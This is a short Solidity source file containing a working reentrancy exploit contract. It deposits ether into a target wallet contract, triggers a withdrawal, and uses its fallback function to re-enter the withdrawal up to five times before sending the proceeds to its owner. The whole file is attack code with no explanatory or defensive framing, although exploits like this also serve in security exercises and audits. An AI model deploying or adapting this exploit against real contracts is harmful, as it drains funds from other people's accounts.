pragma solidity ^0.4.19;

interface IVulnerableCell {
    function Deposit() external payable;
    function Collect(uint _am) external payable;
}

contract ReentrancyExploit {
    IVulnerableCell public target;
    address owner;
    uint public attackCount;
    uint public maxAttacks;

    constructor(address _target) public {
        target = IVulnerableCell(_target);
        owner = msg.sender;
        maxAttacks = 5; // Limit reentries
    }

    function attack() public payable {
        require(msg.sender == owner);
        require(msg.value >= 1 ether);

        // Deposit to victim contract
        target.Deposit.value(msg.value)();

        // Trigger withdrawal
        target.Collect(msg.value);
    }

    function() public payable {
        if (attackCount < maxAttacks) {
            attackCount++;
            target.Collect(msg.value); // Re-enter during Collect()
        }
    }

    function withdraw() public {
        require(msg.sender == owner);
        msg.sender.transfer(this.balance);
    }
}

